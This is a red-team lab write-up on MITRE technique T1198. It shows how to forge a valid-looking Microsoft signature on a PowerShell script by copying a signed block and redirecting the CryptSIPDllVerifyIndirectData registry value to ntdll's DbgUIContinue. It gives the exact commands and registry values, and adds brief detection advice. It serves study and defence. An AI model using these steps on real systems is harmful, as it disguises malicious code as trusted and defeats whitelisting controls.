---
description: 'Defense Evasion, Persistence, Whitelisting Bypass'
---

# T1198: SIP & Trust Provider Hijacking

In this lab, I will try to sign a simple "rogue" powershell script `test-forged.ps1` that only has one line of code, with **Microsoft's** certificate and bypass any whitelisting protections/policies the script may be subject to if it is not signed.

## Execution

The script that I will try to sign:

![](../../.gitbook/assets/trust-ps-file.png)

Just before I start, let's make sure that the script is not signed by using a `Get-AuthenticodeSignature` cmdlet and `sigcheck` by SysInternals:

![](../../.gitbook/assets/trust-not-signed.png)

In order to sign the script with Microsoft's certificate, we need to first find a native Microsoft Signed PowerShell script. I used powershell for this:

```csharp
Get-ChildItem -Path C:\*.ps* -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "# SIG # Begin signature block"
```

![](../../.gitbook/assets/trust-find-signed.png)

I chose one script at random and simply checked if it was signed - luckily it was:

```bash
type C:\Windows\WinSxS\x86_microsoft-windows-m..ell-cmdlets-modules_31bf3856ad364e35_10.0.16299.15_none_c7c20f51cd336675\Wdac.psd1
```

![](../../.gitbook/assets/trust-check-if-signing-block-exists.png)

Let's copy the Microsoft signature block to my script:

![](../../.gitbook/assets/trust-script-with-ms-signing-code.png)

Now let's modify registry at:

```text
HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{603BCC1F-4B59-4E08-B724-D2C6297EF351}
```

From:

![](../../.gitbook/assets/trust-from.png)

To:

{% code title="DLL" %}
```csharp
C:\Windows\System32\ntdll.dll
```
{% endcode %}

{% code title="FuncName" %}
```text
DbgUIContinue
```
{% endcode %}

![](../../.gitbook/assets/trust-to.png)

Now, let's launch a new powershell instance \(for the registry changes to take effect\) and check the signature of the forged script - note how it now shows as signed, verified and valid:

![](../../.gitbook/assets/trust-signed.png)

## Observations

Monitoring the following registry keys/values helps discover this suspicious activity:

![](../../.gitbook/assets/trust-sysmon1.png)

![](../../.gitbook/assets/trust-sysmon2.png)

## References

For all the registry keys/values that should be used as a baseline, please refer to the original research whitepaper by Matt Graeber:   
[SpecterOps Subverting Trust inWindows](https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf)

{% embed url="https://attack.mitre.org/wiki/Technique/T1198" %}

{% embed url="https://www.youtube.com/watch?v=wxmxxgL6Nz8" %}

{% embed url="https://pentestlab.blog/2017/11/06/hijacking-digital-signatures/" %}

{% embed url="http://ultimate-sysadmin-fanboy.blogspot.com/2015/06/unable-to-renew-certificate-via.html" %}

{% embed url="https://blogs.msdn.microsoft.com/sqlforum/2011/01/02/walkthrough-request-a-digital-certificate-from-certificate-server-or-create-a-testing-digital-certificate-to-sign-a-package/" %}

{% embed url="https://www.youtube.com/watch?v=WrHTJQovDoY" %}

{% embed url="https://www.hanselman.com/blog/SigningPowerShellScripts.aspx" %}

{% embed url="https://github.com/netbiosX/Digital-Signature-Hijack" %}

